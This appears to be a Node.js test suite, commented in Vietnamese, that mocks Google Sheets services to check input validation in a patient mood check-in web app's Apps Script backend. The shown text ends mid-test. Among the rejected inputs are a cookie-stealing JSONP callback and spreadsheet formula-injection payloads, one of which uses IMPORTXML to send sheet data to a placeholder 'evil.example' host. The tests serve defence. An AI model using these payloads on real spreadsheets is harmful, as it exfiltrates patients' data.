/* =========================================================
   Test google_apps_script.js bằng Node (QA): giả lập SpreadsheetApp / ContentService /
   LockService / Utilities rồi gọi doGet / doPost như Apps Script sẽ gọi.
   Không gọi mạng, không đụng Sheet thật. Chạy: node tests/test-gas.js   (FAIL → exit 1)
   Kiểm: doGet không trả dữ liệu, JSONP callback được lọc, doPost whitelist 10 mức / 6 cảm xúc,
   Mã số bệnh nhân (01/11/2026: bỏ khoảng trắng/chấm/gạch, còn 3–20 chữ số, giữ số 0 đầu), chặn công thức
   = + - @, giới hạn độ dài, LockService, ghi đúng tab theo tên, giờ: giờ máy chủ − ageMs hợp lệ (0…8 ngày)
   hoặc giờ máy chủ, cùng Mã phiên + cùng mã số thì cập nhật và giữ cột A, khác mã số thì session_conflict,
   Mã phiên bắt buộc (dự án mới không nhận app cũ), B1 "Số điện thoại" tự đổi thành "Mã số bệnh nhân".
   02/11/2026: 9 cảm xúc theo bộ ảnh mới (Vui vẻ, Đau khổ, Lo lắng, Tức giận, Hoảng hốt, Khó chịu, Mệt mỏi, Bình an,
   Cô đơn) + vẫn nhận nhãn cũ "Buồn" (web bản cũ, ghi nguyên chữ); menu cài một lần (onOpen →
   caiDatBangBacSi): tô màu theo mức ĐỎ 1–3 / VÀNG 4–5 / XANH 6–10, tab Tổng hợp, tab Tra cứu, khóa cứng các tab.
   04/11/2026: tab "Hướng xử trí" (chữ tĩnh, khóa cứng, ngay sau Tra cứu) + cột "Gợi ý mở đầu" (Tổng hợp G, Tra cứu E):
   bộ đánh giá công thức nhỏ chạy chính công thức ghi vào ô, so với bảng quyết định trong spec (11 dòng + quét mức × thẻ).
   Cuối file: kiểm nhanh google_apps_script-du-an-cu.js (bản cho dự án CŨ) vẫn tắt doGet và nhận app cũ.
   ========================================================= */
'use strict';
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const APP = path.resolve(__dirname, '..');
const SRC = fs.readFileSync(path.join(APP, 'google_apps_script.js'), 'utf8');
const SRC_OLD = fs.readFileSync(path.join(APP, 'google_apps_script-du-an-cu.js'), 'utf8');
let fails = 0;
let passes = 0;
const T = (name, ok, detail) => { if (ok) passes++; else fails++; console.log((ok ? 'PASS ' : 'FAIL ') + name + (detail !== undefined ? '  → ' + String(detail).replace(/\s+/g, ' ').slice(0, 240) : '')); };

/* ===== Giả lập Sheet ===== */
/* "B2" → [2, 2, 1, 1]; "A2:D1000" → [2, 1, 999, 4] */
const colNum = L => L.split('').reduce((n, ch) => n * 26 + ch.charCodeAt(0) - 64, 0);
function parseA1(a1) {
  const m = /^([A-Z]+)(\d+)(?::([A-Z]+)(\d+))?$/.exec(a1);
  if (!m) throw new Error('mock: A1 lạ ' + a1);
  const r = +m[2], c = colNum(m[1]);
  return m[3] ? [r, c, +m[4] - r + 1, colNum(m[3]) - c + 1] : [r, c, 1, 1];
}
function makeSheet(name) {
  const s = { name, rows: [], frozen: 0, hidden: [], fmt: [], numFmt: [], maxRows: 1000, cfRules: [], protections: [], meta: [], formulas: {}, widths: {}, borders: [], cleared: 0, merges: [], wraps: [], valign: [] };
  s.getLastRow = () => s.rows.length;
  s.getMaxRows = () => s.maxRows;
  s.appendRow = r => { s.rows.push(r.slice()); };
  s.setFrozenRows = n => { s.frozen = n; };
  s.hideColumns = c => { s.hidden.push(c); };
  s.deleteRow = n => { s.rows.splice(n - 1, 1); };
  s.setColumnWidth = (c, w) => { s.widths[c] = w; };
  s.inserted = [];
  s.insertRowsAfter = (after, n) => { s.inserted.push(after + '+' + n); s.maxRows += n; return s; };
  /* clear() KHÔNG bỏ ô gộp (giả định khó nhất): script phải tự breakApart trước khi gộp lại */
  s.clear = () => { s.cleared++; s.rows = []; s.formulas = {}; s.numFmt = []; s.fmt = []; s.borders = []; s.wraps = []; s.valign = []; return s; };
  s.getConditionalFormatRules = () => s.cfRules.slice();
  s.setConditionalFormatRules = rules => { s.cfRules = rules.slice(); };
  s.getDeveloperMetadata = () => s.meta.map(m => ({ getKey: () => m.key, getValue: () => m.value }));
  s.addDeveloperMetadata = (key, value) => { s.meta.push({ key, value }); return s; };
  s.getProtections = type => s.protections.filter(p => p.type === type);
  s.protect = () => {
    const p = { type: 'SHEET', desc: '', warningOnly: false, editors: ['ban-dau@vi-du.vn', 'chu-file@vi-du.vn'], domainEdit: true, unprotected: [], removed: false };
    p.setDescription = d => { p.desc = d; return p; };
    p.getDescription = () => p.desc;
    p.setWarningOnly = w => { p.warningOnly = w; return p; };
    p.addEditor = u => { const e = u.getEmail(); if (!p.editors.includes(e)) p.editors.push(e); return p; };
    p.getEditors = () => p.editors.map(e => ({ getEmail: () => e }));
    /* Như Google: không gỡ được chủ file */
    p.removeEditors = list => { const out = list.map(u => u.getEmail()); p.editors = p.editors.filter(e => e === 'chu-file@vi-du.vn' || !out.includes(e)); return p; };
    p.canDomainEdit = () => p.domainEdit;
    p.setDomainEdit = v => { p.domainEdit = v; return p; };
    p.setUnprotectedRanges = rs => { p.unprotected = rs.map(r => r.a1); return p; };
    p.remove = () => { p.removed = true; s.protections = s.protections.filter(x => x !== p); };
    s.protections.push(p);
    return p;
  };
  s.getRange = (r0, c0, nr0, nc0) => {
    let r = r0, c = c0, nr = nr0, nc = nc0, a1 = null;
    if (typeof r0 === 'string') { a1 = r0; [r, c, nr, nc] = parseA1(r0); }
    /* Như Google: vùng vượt số hàng của tab → lỗi (appendRow mới tự thêm hàng, getRange thì không) */
    if (r < 1 || r + (nr || 1) - 1 > s.maxRows) throw new Error('The coordinates of the range are outside the dimensions of the sheet.');
    return {
      a1: a1 || (r + ',' + c),
      getValues: () => Array.from({ length: nr || 1 }, (_, i) => Array.from({ length: nc || 1 }, (_, j) => { const row = s.rows[r - 1 + i] || []; return row[c - 1 + j] == null ? '' : row[c - 1 + j]; })),
      setValues(vals) { vals.forEach((v, i) => { const row = s.rows[r - 1 + i] || (s.rows[r - 1 + i] = []); v.forEach((x, j) => { row[c - 1 + j] = x; }); }); return this; },
      getValue: () => { const row = s.rows[r - 1] || []; return row[c - 1] == null ? '' : row[c - 1]; },
      setValue(x) { const row = s.rows[r - 1] || (s.rows[r - 1] = []); row[c - 1] = x; return this; },
      setFormula(f) { s.formulas[a1 || (r + ',' + c)] = f; return this; },
      setNumberFormat(f) { s.numFmt.push((a1 ? a1 + ',' : '') + r + ',' + c + ',' + (nr || 1) + 'x' + (nc || 1) + '=' + f); return this; },
      setBorder() { s.borders.push(a1); return this; },
      setWrap(w) { s.wraps.push((a1 || (r + ',' + c + ',' + (nr || 1) + 'x' + (nc || 1))) + '=' + w); return this; },
      setVerticalAlignment(v) { s.valign.push((a1 || (r + ',' + c + ',' + (nr || 1) + 'x' + (nc || 1))) + '=' + v); return this; },
      setFontSize(x) { s.fmt.push((a1 ? a1 + ':' : '') + 'size' + x); return this; },
      /* Như Google: gộp chồng lên ô đã gộp khác → lỗi */
      merge() { const box = [r, c, nr || 1, nc || 1]; const hit = m => !(m[0] + m[2] - 1 < box[0] || box[0] + box[2] - 1 < m[0] || m[1] + m[3] - 1 < box[1] || box[1] + box[3] - 1 < m[1]); if (s.merges.some(m => hit(m.box))) throw new Error('You must select all cells in a merged range to merge or unmerge them.'); s.merges.push({ a1, box }); return this; },
      breakApart() { const R = [r, c, nr || 1, nc || 1]; s.merges = s.merges.filter(m => !(m.box[0] >= R[0] && m.box[1] >= R[1] && m.box[0] + m.box[2] <= R[0] + R[2] && m.box[1] + m.box[3] <= R[1] + R[3])); return this; },
      setFontWeight(x) { s.fmt.push(x); return this; }, setBackground(x) { s.fmt.push((a1 ? a1 + ':' : '') + x); return this; }, setFontColor(x) { s.fmt.push(x); return this; }
    };
  };
  return s;
}
/* Trình dựng quy tắc định dạng có điều kiện giả lập.
   localize = true: getCriteriaValues trả công thức kiểu Google có thể trả khi Sheet đặt ngôn ngữ Việt
   (dấu phân cách ";" và có khoảng trắng) – không còn trùng nguyên chuỗi đã đặt. */
const localized = f => f.replace(/,/g, '; ').replace(/\(/g, '( ');
function newRule(localize) {
  const st = { formula: null, bg: null, ranges: [] };
  const b = {
    whenFormulaSatisfied: f => { st.formula = f; return b; },
    setBackground: c => { st.bg = c; return b; },
    setRanges: rs => { st.ranges = rs.map(r => r.a1); return b; },
    build: () => ({ formula: st.formula, bg: st.bg, ranges: st.ranges, getBooleanCondition: () => ({ getCriteriaValues: () => [localize ? localized(st.formula) : st.formula] }) })
  };
  return b;
}

function load(opts) {
  const o = opts || {};
  const src = o.src || SRC;
  const sheets = {};
  let active = null;
  /* Locale của file: 'en' (mặc định, =SUM(1,2) ra 3) | 'vi' (=SUM(1,2) hiểu "1,2" là số 1,2 → ra 1,2).
     probeFail: không tạo được tab tạm để thử → script đoán theo getSpreadsheetLocale(). */
  const loc = { locale: o.locale || 'en', probes: [], deleted: [] };
  /* Thứ tự tab = thứ tự khóa của object sheets; getIndex đếm từ 1 như Google */
  const withIndex = sh => { if (sh && !sh.getIndex) sh.getIndex = () => Object.keys(sheets).indexOf(sh.name) + 1; return sh; };
  const moves = [];
  const ss = {
    getSheetByName: n => withIndex(sheets[n] || null),
    getSheets: () => Object.keys(sheets).map(n => withIndex(sheets[n])),
    setActiveSheet: sh => { active = sh; return sh; },
    /* Như Google: đưa tab ĐANG CHỌN về vị trí pos (đếm từ 1) */
    moveActiveSheet: pos => {
      const names = Object.keys(sheets).filter(n => n !== active.name);
      if (pos < 1 || pos > names.length + 1) throw new Error('mock: vị trí tab lạ ' + pos);
      names.splice(pos - 1, 0, active.name);
      const copy = Object.assign({}, sheets);
      Object.keys(sheets).forEach(n => { delete sheets[n]; });
      names.forEach(n => { sheets[n] = copy[n]; });
      moves.push(active.name + '@' + pos);
    },
    insertSheet: n => {
      if (/^__thu_cu_phap_/.test(n)) {
        loc.probes.push(n);
        if (o.probeFail) throw new Error('Không tạo được tab');
        const sh = makeSheet(n);
        const gr = sh.getRange;
        sh.getRange = (...a) => { const r = gr(...a); const sf = r.setFormula; r.setFormula = f => { sf.call(r, f); r._f = f; return r; }; r.getValue = () => (sh.formulas.A1 === '=SUM(1,2)' ? (loc.locale === 'vi' ? 1.2 : 3) : ''); return r; };
        return (sheets[n] = sh);
      }
      return withIndex(sheets[n] = makeSheet(n));
    },
    deleteSheet: sh => { loc.deleted.push(sh.name); delete sheets[sh.name]; },
    getSpreadsheetLocale: () => (loc.locale === 'vi' ? 'vi_VN' : 'en_US'),
    getActiveSheet: () => active
  };
  const ui = { menus: [], alerts: [], noUi: !!o.noUi };
  const lock = { waits: 0, held: 0, max: 0, fail: !!o.lockFail };
  const sandbox = {
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ss,
      flush: () => {},
      newConditionalFormatRule: () => newRule(!!o.localizeCF),
      ProtectionType: { SHEET: 'SHEET', RANGE: 'RANGE' },
      BorderStyle: { SOLID_MEDIUM: 'SOLID_MEDIUM' },
      getUi: () => {
        if (ui.noUi) throw new Error('Cannot call SpreadsheetApp.getUi() from this context.');
        return {
          alert: m => { ui.alerts.push(m); },
          createMenu: name => { const m = { name, items: [], added: false }; const api = { addItem: (label, fn) => { m.items.push([label, fn]); return api; }, addToUi: () => { m.added = true; ui.menus.push(m); } }; return api; }
        };
      }
    },
    Session: { getEffectiveUser: () => ({ getEmail: () => 'chu-file@vi-du.vn' }) },
    ContentService: { MimeType: { JSON: 'json', JAVASCRIPT: 'js' }, createTextOutput: t => ({ text: t, mime: null, setMimeType(m) { this.mime = m; return this; }, getContent() { return this.text; } }) },
    LockService: { getScriptLock: () => ({ waitLock() { if (lock.fail) throw new Error('Lock timeout'); lock.waits++; lock.held++; lock.max = Math.max(lock.max, lock.held); }, releaseLock() { lock.held--; } }) },
    /* Ghi kèm mốc thời gian để test biết giờ lấy từ đâu */
    Utilities: { formatDate: (d, tz, f) => 'TZ[' + tz + '|' + f + '|' + d.getTime() + ']' },
    Logger: { log() {} },
    console
  };
  vm.createContext(sandbox);
  vm.runInContext(src, sandbox, { filename: o.src ? 'google_apps_script-du-an-cu.js' : 'google_apps_script.js' });
  if (o.setup) o.setup(sheets, s => { active = s; });
  const P = body => JSON.parse(sandbox.doPost({ postData: { contents: typeof body === 'string' ? body : JSON.stringify(body) } }).getContent());
  const G = p => sandbox.doGet({ parameter: p || {} });
  return { sandbox, sheets, lock, ui, loc, moves, P, G, setActive: s => { active = s; } };
}

const sid = n => 'sess-0000-' + String(n).padStart(4, '0');
const tsOf = cell => Number((/\|(\d+)\]$/.exec(String(cell)) || [])[1]);
const TZ_RE = /^TZ\[Asia\/Ho_Chi_Minh\|HH:mm:ss dd\/MM\/yyyy\|\d+\]$/;
/* Payload ĐÚNG như app cũ (ditruyenhungvuong/checkin f76adc9): dự án mới phải từ chối, bản dự án cũ phải nhận */
const LEGACY = { created_at: '08:00:00 01/10/2026', phone: '0912345678', part1: '7 - Tốt', part2: 'Vui vẻ' };
/* Payload bản 30/10/2026 (checkin-V2, trường phone, có Mã phiên) */
const V2 = { sessionId: sid(9), phone: '0912345678', level: 3, part1: '3 - Tồi tệ', part2: 'Lo lắng' };
const OK = { sessionId: sid(1), patientId: '26012345', level: 3, part1: '3 - Tồi tệ', part2: 'Lo lắng' };
const OLD_HEADER = ['Thời gian', 'Số điện thoại', 'Phần 1: Mức cảm xúc', 'Phần 2: Cảm xúc Capybara'];
const NEW_HEADER = 'Thời gian|Mã số bệnh nhân|Phần 1: Mức cảm xúc|Phần 2: Cảm xúc Capybara|Mã phiên';
const noFormula = sh => sh.rows.every(r => r.every(c => !/^[=+\-@]/.test(String(c))));

/* ===== doGet: không còn đọc dữ liệu ===== */
{
  const env = load();
  env.sheets.CheckIn = makeSheet('CheckIn');
  env.sheets.CheckIn.rows.push(OLD_HEADER, ['08:00:00 01/10/2026', '0911111111', '2 - Rất tồi tệ', 'Buồn']);
  const out = env.G({});
  T('doGet: trả public_read_disabled, MimeType JSON', out.getContent() === '{"result":"error","error":"public_read_disabled"}' && out.mime === 'json', out.getContent());
  T('doGet: không lộ dữ liệu dù Sheet có dữ liệu', !/0911111111|Rất tồi tệ/.test(out.getContent()));
  const jp = env.G({ callback: 'alert(document.cookie)//' });
  T('doGet: bỏ JSONP – có ?callback= vẫn trả JSON thuần, không trả JavaScript', jp.getContent() === '{"result":"error","error":"public_read_disabled"}' && jp.mime === 'json', jp.getContent());
  T('Nguồn: doGet không gọi getRange/getValues (không có đường đọc bảng)', !/function doGet[\s\S]*?\n}/.exec(SRC)[0].match(/getRange|getValues|sheet_\(/));
}

/* ===== doPost: luồng đúng ===== */
{
  const env = load({ setup: (sheets, setActive) => { setActive((sheets.Khac = makeSheet('Khac'))); } });
  const r = env.P(OK);
  const sh = env.sheets.CheckIn;
  T('POST hợp lệ → success inserted, không trả số dòng', JSON.stringify(r) === '{"result":"success","action":"inserted"}', JSON.stringify(r));
  T('Ghi đúng tab tên "CheckIn" (tự tạo), không ghi vào tab đang mở "Khac"', !!sh && env.sheets.Khac.rows.length === 0);
  T('Tab trống: 5 tiêu đề (B "Mã số bệnh nhân"), đóng băng hàng 1, ẩn cột E', sh.rows[0].join('|') === NEW_HEADER && sh.frozen === 1 && sh.hidden.includes(5), sh.rows[0].join('|'));
  T('Dòng ghi: giờ Asia/Ho_Chi_Minh (không ageMs → giờ máy chủ), mã số, "3 - Tồi tệ", "Lo lắng", Mã phiên', TZ_RE.test(sh.rows[1][0]) && Math.abs(tsOf(sh.rows[1][0]) - Date.now()) < 5000 && JSON.stringify(sh.rows[1].slice(1)) === JSON.stringify(['26012345', '3 - Tồi tệ', 'Lo lắng', sid(1)]), JSON.stringify(sh.rows[1]));
  T('Dòng ghi đặt định dạng văn bản @ chỉ cho dòng đó (giữ số 0 đầu)', sh.numFmt.includes('2,1,1x5=@') && sh.numFmt.length === 1, sh.numFmt.join(' '));
  T('LockService: chờ khóa và nhả khóa', env.lock.waits === 1 && env.lock.held === 0);
  const colA = sh.rows[1][0];
  const r2 = env.P(Object.assign({}, OK, { patientId: '260 123 45', level: 4, part1: '4 - Kém', ageMs: 3 * 864e5 }));
  T('Cùng Mã phiên + cùng mã số ("260 123 45" = 26012345) → updated, vẫn 1 dòng, cập nhật mức, GIỮ cột A', r2.action === 'updated' && sh.rows.length === 2 && sh.rows[1][2] === '4 - Kém' && sh.rows[1][0] === colA, JSON.stringify(r2) + ' ' + JSON.stringify(sh.rows[1]));
  T('Cập nhật: định dạng @ chỉ đặt cho B–E của dòng đó', sh.numFmt[sh.numFmt.length - 1] === '2,2,1x4=@', sh.numFmt.join(' '));
  const r3 = env.P(Object.assign({}, OK, { patientId: '26099999', level: 10, part2: 'Vui vẻ' }));
  T('Cùng Mã phiên mà KHÁC mã số → session_conflict, dòng cũ không đổi', JSON.stringify(r3) === '{"result":"error","error":"session_conflict"}' && sh.rows[1][1] === '26012345' && sh.rows[1][2] === '4 - Kém' && sh.rows.length === 2, JSON.stringify(r3) + ' ' + JSON.stringify(sh.rows[1]));
  env.P(Object.assign({}, OK, { sessionId: sid(5), patientId: '26012345', level: '8', part1: '=HYPERLINK("https://evil";"x")', part2: 'Hoảng hốt', created_at: '=NOW()' }));
  T('part1 client gửi bị bỏ, server ghép lại từ bảng; created_at client bị bỏ', sh.rows[2] && sh.rows[2][2] === '8 - Rất tốt' && TZ_RE.test(sh.rows[2][0]), JSON.stringify(sh.rows[2]));
  T('Không ô nào trong Sheet bắt đầu bằng = + - @', noFormula(sh));
}

/* ===== Mã số bệnh nhân: chỉ chữ số, 3–20 số sau khi bỏ khoảng trắng/chấm/gạch ===== */
{
  const env = load();
  const sh = () => env.sheets.CheckIn;
  const keep = [
    ['26012345', '26012345'],
    ['0012345', '0012345'],
    ['260 123 45', '26012345'],
    ['260.123.45', '26012345'],
    ['260-123-45', '26012345'],
    ['  26012345  ', '26012345'],
    ['123', '123'],
    ['1'.repeat(20), '1'.repeat(20)],
    ['00 000 000 000 000 000 01', '0000000000000000001'],
    ['-26012345 (dấu gạch đầu bị bỏ như mọi dấu gạch)', '26012345'],
    ['0912345678', '0912345678']
  ];
  const got = keep.map(([raw, want], i) => {
    const r = env.P(Object.assign({}, OK, { sessionId: sid(200 + i), patientId: raw.replace(/ \(.*\)$/, '') }));
    const b = r.result === 'success' ? sh().rows[sh().rows.length - 1][1] : '';
    return { raw, ok: r.result === 'success' && b === want && typeof b === 'string' && /^\d+$/.test(b), got: JSON.stringify(r) + ' B=' + b };
  });
  T('Mã số: ' + keep.length + ' mẫu hợp lệ (26012345, "0012345" giữ số 0, "260 123 45", chấm, gạch, 3 số, 20 số…) ghi đúng, cột B chỉ chữ số', got.every(g => g.ok), got.filter(g => !g.ok).map(g => g.raw + ':' + g.got).join(' | '));
  T('Mã số "0012345": ô B là CHUỖI "0012345" và dòng đặt định dạng @ (Sheets không cắt số 0)', sh().rows.some(r => r[1] === '0012345') && sh().numFmt.every(f => f.endsWith('=@')));
  const drop = [
    ['"12" (2 số)', '12'],
    ['21 chữ số', '1'.repeat(21)],
    ['"HV123"', 'HV123'],
    ['"=1+1"', '=1+1'],
    ['rỗng', ''],
    ['chỉ khoảng trắng', '   '],
    ['"+26012345"', '+26012345'],
    ['"@26012345"', '@26012345'],
    ['"26012345abc"', '26012345abc'],
    ['"(026) 012345" (ngoặc)', '(026) 012345'],
    ['"260_123"', '260_123'],
    ['chữ số Ả Rập-Ấn "٢٦٠١٢٣"', '٢٦٠١٢٣'],
    ['=IMPORTXML(...)', '=IMPORTXML("https://evil.example/?d="&JOIN(";";B2:D500);"//a")'],
    ['41 ký tự (phần lớn là khoảng trắng)', '123' + ' '.repeat(38)],
    ['là số 26012345 (không phải chuỗi)', 26012345],
    ['là mảng', ['26012345']],
    ['null', null],
    ['thiếu trường', undefined]
  ];
  const dropped = drop.map(([n, raw], i) => { const b = Object.assign({}, OK, { sessionId: sid(250 + i), patientId: raw }); if (raw === undefined) delete b.patientId; const r = env.P(b); return { n, ok: r.error === 'patient_id_invalid' && !r.retry, r }; });
  T('Mã số: ' + drop.length + ' mẫu sai ("12", 21 chữ số, "HV123", "=1+1", rỗng, + @ đầu, ngoặc, chữ số ngoài ASCII, kiểu số/mảng…) → patient_id_invalid', dropped.every(d => d.ok), dropped.filter(d => !d.ok).map(d => d.n + ':' + JSON.stringify(d.r)).join(' | '));
  T('Mã số: không ô nào bắt đầu bằng = + - @', noFormula(sh()));
}

/* ===== Dự án mới KHÔNG nhận lượt thiếu Mã phiên hay trường phone cũ ===== */
{
  const env = load();
  const r1 = env.P(LEGACY);
  T('Payload app cũ f76adc9 (không Mã phiên) → session_invalid, không ghi', r1.error === 'session_invalid' && !env.sheets.CheckIn, JSON.stringify(r1));
  const r2 = env.P(V2);
  T('Payload bản 30/10 (trường phone, chưa có patientId) → patient_id_invalid, không ghi', r2.error === 'patient_id_invalid' && !env.sheets.CheckIn, JSON.stringify(r2));
  const r3 = env.P(Object.assign({}, OK, { level: undefined }));
  T('Thiếu level (không còn đọc số mức từ part1 "3 - Tồi tệ") → level_invalid', r3.error === 'level_invalid', JSON.stringify(r3));
  T('Nguồn: đã bỏ legacyPhone_, normalizePhone_, nhánh app cũ', !/legacyPhone_|normalizePhone_|LEGACY_PHONE/.test(SRC));
}

/* ===== ageMs: độ trễ từ lúc bấm tới lúc gửi, giờ = giờ nhận − ageMs (không phụ thuộc đồng hồ điện thoại) ===== */
{
  const env = load();
  const sh = () => env.sheets.CheckIn;
  const cases = [
    ['0 ms (gửi ngay) → giờ nhận', 0, true],
    ['1 giờ (gửi lại sau mất mạng) → giờ nhận − 1 giờ', 3600e3, true],
    ['6 ngày (hàng chờ 7 ngày) → giờ nhận − 6 ngày', 6 * 864e5, true],
    ['đúng 8 ngày → nhận', 8 * 864e5, true],
    ['9 ngày → giờ máy chủ', 9 * 864e5, false],
    ['âm (đồng hồ máy bị chỉnh lùi giữa chừng) → giờ máy chủ', -5000, false],
    ['chuỗi số → giờ máy chủ', '3600000', false],
    ['số lẻ → giờ máy chủ', 3600e3 + 0.5, false],
    ['null → giờ máy chủ', null, false],
    ['mốc tuyệt đối kiểu clientTs (Date.now()) → giờ máy chủ', Date.now(), false]
  ];
  const got = cases.map(([n, age, useAge], i) => {
    const t0 = Date.now();
    const r = env.P(Object.assign({}, OK, { sessionId: sid(100 + i), ageMs: age }));
    const t1 = Date.now();
    const a = tsOf(sh().rows[sh().rows.length - 1][0]);
    const want = useAge ? [t0 - age, t1 - age] : [t0, t1];
    const ok = r.result === 'success' && a >= want[0] && a <= want[1];
    return (ok ? 'ok ' : 'LỖI ') + n + ' (' + a + ')';
  });
  T('ageMs: 4 trường hợp 0…8 ngày ghi giờ nhận − ageMs, 6 trường hợp ngoài khoảng/sai kiểu ghi giờ máy chủ', got.every(x => x.startsWith('ok')), got.join(' | '));
  T('Nguồn: không còn nhận clientTs (giờ tuyệt đối của điện thoại)', !/clientTs/.test(SRC));
}

/* ===== Mức: whitelist chặt kiểu ===== */
{
  const env = load();
  const loose = [true, [7], '0x7', '1e1', ' 8 ', '7.0', 7.5, -1, 0, 11, {}];
  const got = loose.map(v => { const r = env.P(Object.assign({}, OK, { level: v, part1: '' })); return { v: JSON.stringify(v), ok: r.error === 'level_invalid' }; });
  T('Mức: true, [7], "0x7", "1e1", " 8 ", "7.0", 7.5, -1, 0, 11, {} đều bị từ chối', got.every(g => g.ok), got.filter(g => !g.ok).map(g => g.v).join(', '));
  T('Mức: 7 (số) và "7" (chuỗi số) được nhận', env.P(Object.assign({}, OK, { level: 7 })).result === 'success' && env.P(Object.assign({}, OK, { sessionId: sid(2), level: '7' })).result === 'success');
}

/* ===== doPost: chặn dữ liệu xấu ===== */
{
  const env = load();
  const bad = [
    ['patientId "=1+1+1+1+1"', Object.assign({}, OK, { patientId: '=1+1+1+1+1' }), 'patient_id_invalid'],
    ['patientId "abcdefghi"', Object.assign({}, OK, { patientId: 'abcdefghi' }), 'patient_id_invalid'],
    ['patientId thiếu', Object.assign({}, OK, { patientId: '' }), 'patient_id_invalid'],
    ['level 0', Object.assign({}, OK, { level: 0 }), 'level_invalid'],
    ['level 11', Object.assign({}, OK, { level: 11 }), 'level_invalid'],
    ['level 2.5', Object.assign({}, OK, { level: 2.5 }), 'level_invalid'],
    ['level "abc"', Object.assign({}, OK, { level: 'abc' }), 'level_invalid'],
    ['cảm xúc rỗng', Object.assign({}, OK, { part2: '' }), 'emotion_required'],
    ['cảm xúc ngoài 9 nhãn', Object.assign({}, OK, { part2: 'Hạnh phúc' }), 'emotion_invalid'],
    ['cảm xúc là công thức', Object.assign({}, OK, { part2: '@SUM(A1)' }), 'emotion_invalid'],
    ['sessionId có ký tự lạ', Object.assign({}, OK, { sessionId: '=1+1+1+1+1+1' }), 'session_invalid'],
    ['sessionId bắt đầu bằng "-"', Object.assign({}, OK, { sessionId: '-abcdefgh' }), 'session_invalid'],
    ['sessionId 7 ký tự', Object.assign({}, OK, { sessionId: 'abc-def' }), 'session_invalid'],
    ['sessionId là số', Object.assign({}, OK, { sessionId: 12345678 }), 'session_invalid'],
    ['sessionId 41 ký tự', Object.assign({}, OK, { sessionId: 'a'.repeat(41) }), 'session_invalid'],
    ['sessionId thiếu', Object.assign({}, OK, { sessionId: undefined }), 'session_invalid'],
    ['sessionId rỗng', Object.assign({}, OK, { sessionId: '' }), 'session_invalid'],
    ['cảm xúc là mảng', Object.assign({}, OK, { part2: ['Vui vẻ'] }), 'emotion_invalid']
  ];
  const got = bad.map(([n, body, code]) => { const r = env.P(body); return { n, ok: r.result === 'error' && r.error === code && !r.retry, r }; });
  T(bad.length + ' payload xấu đều bị từ chối đúng mã lỗi, không retry', got.every(g => g.ok), got.filter(g => !g.ok).map(g => g.n + ':' + JSON.stringify(g.r)).join(' | '));
  T('Payload xấu: không dòng nào được ghi (tab chưa tạo hoặc chỉ có tiêu đề)', !env.sheets.CheckIn || env.sheets.CheckIn.rows.length <= 1);
  T('Payload xấu: không chờ khóa (kiểm trước, ghi sau)', env.lock.waits === 0);
  T('Body > 2000 ký tự → too_large', env.P(JSON.stringify(Object.assign({}, OK, { pad: 'x'.repeat(2100) }))).error === 'too_large');
  T('Body không phải JSON → bad_json', env.P('khong phai json').error === 'bad_json');
  T('Body JSON là chuỗi "abc" → bad_json', env.P('"abc"').error === 'bad_json');
  T('Body JSON là mảng → bad_json', env.P('[1,2]').error === 'bad_json');
  T('Không postData → no_data', JSON.parse(env.sandbox.doPost({}).getContent()).error === 'no_data' && JSON.parse(env.sandbox.doPost(undefined).getContent()).error === 'no_data');
}

/* ===== Khóa bận → báo retry, không lộ lỗi nội bộ ===== */
{
  const env = load({ lockFail: true });
  const r = env.P(OK);
  T('Khóa bận: {result:error, error:server_busy, retry:true}, không kèm thông điệp nội bộ', JSON.stringify(r) === '{"result":"error","error":"server_busy","retry":true}', JSON.stringify(r));
}

/* ===== Tab đã có tiêu đề cũ "Số điện thoại" (dữ liệu ghi 30–31/10/2026) ===== */
{
  const env = load();
  env.sheets.CheckIn = makeSheet('CheckIn');
  env.sheets.CheckIn.rows.push(OLD_HEADER.concat(['Mã phiên']), ['08:00:00 31/10/2026', '0911111111', '2 - Rất tồi tệ', 'Buồn', sid(77)]);
  env.P(OK);
  const sh = env.sheets.CheckIn;
  T('Tab cũ: B1 "Số điện thoại" đổi thành "Mã số bệnh nhân", không đụng A1, E1 và dòng cũ', sh.rows[0].join('|') === NEW_HEADER && sh.rows[1][1] === '0911111111' && sh.rows.length === 3 && sh.rows[2][1] === '26012345', JSON.stringify(sh.rows));
  T('Tab cũ: định dạng @ chỉ đặt cho dòng mới (dòng 3)', sh.numFmt.join(' ') === '3,1,1x5=@', sh.numFmt.join(' '));
  const env2 = load();
  env2.sheets.CheckIn = makeSheet('CheckIn');
  env2.sheets.CheckIn.rows.push(OLD_HEADER, ['08:00:00 01/10/2026', '0911111111', '2 - Rất tồi tệ', 'Buồn']);
  env2.P(OK);
  T('Tab 4 cột: thêm E "Mã phiên" + ẩn, đổi B1, dòng cũ giữ nguyên', env2.sheets.CheckIn.rows[0].join('|') === NEW_HEADER && env2.sheets.CheckIn.hidden.includes(5) && env2.sheets.CheckIn.rows[1][1] === '0911111111', JSON.stringify(env2.sheets.CheckIn.rows[0]));
  const env3 = load();
  env3.sheets.CheckIn = makeSheet('CheckIn');
  env3.sheets.CheckIn.rows.push(['Thời gian', 'Mã BN (anh tự đặt)', 'Phần 1: Mức cảm xúc', 'Phần 2: Cảm xúc Capybara', 'Mã phiên']);
  env3.P(OK);
  T('Tab có tiêu đề B1 anh tự đặt (khác "Số điện thoại") → giữ nguyên chữ của anh', env3.sheets.CheckIn.rows[0][1] === 'Mã BN (anh tự đặt)');
}

/* ===== 9 cảm xúc (02/11/2026): 3 nhãn mới nhận đúng, chuỗi lạ/gần giống vẫn bị từ chối ===== */
{
  const env = load();
  const NINE = ['Vui vẻ', 'Đau khổ', 'Lo lắng', 'Tức giận', 'Hoảng hốt', 'Khó chịu', 'Mệt mỏi', 'Bình an', 'Cô đơn'];
  T('EMOTION_LABELS đúng 9 nhãn theo bộ ảnh mới, đúng thứ tự anh duyệt', JSON.stringify(env.sandbox.EMOTION_LABELS) === JSON.stringify(NINE), JSON.stringify(env.sandbox.EMOTION_LABELS));
  const got = NINE.map((e, i) => { const r = env.P(Object.assign({}, OK, { sessionId: sid(300 + i), part2: e })); const row = env.sheets.CheckIn.rows[env.sheets.CheckIn.rows.length - 1]; return { e, ok: r.result === 'success' && row[3] === e }; });
  T('9 cảm xúc đều ghi được, cột D đúng nguyên chuỗi', got.every(g => g.ok), got.filter(g => !g.ok).map(g => g.e).join(', '));
  /* Web bản 01/11 đang chạy (và hàng chờ trên máy chị) còn gửi "Buồn": phải nhận, ghi NGUYÊN chữ */
